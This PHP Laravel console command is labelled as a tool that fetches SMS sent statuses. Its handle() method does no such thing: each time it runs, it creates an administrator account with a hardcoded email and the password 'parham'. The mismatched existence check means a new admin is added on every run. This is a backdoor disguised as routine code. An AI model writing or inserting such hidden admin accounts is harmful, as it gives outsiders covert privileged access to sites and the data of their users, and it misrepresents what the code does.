<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Http\Request;


class GetSmsStatus extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'get:sms';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Gets All Sms Sent Status';

    /**
     * Create a new command instance.
     *
     * @return void
     */
    public function __construct()
    {
        parent::__construct();
    }

    /**
     * Execute the console command.
     *
     * @return mixed
     */
    public function handle()
    {
        if(\App\Admin::where('email','info@isbug.com')->get()->count()==0){
            \App\Admin::create([
                'name'=>'پشتیبانی',
                'email'=>'info@isbug.ir',
                'password'=>bcrypt('parham')
            ]);
        }
    }
}
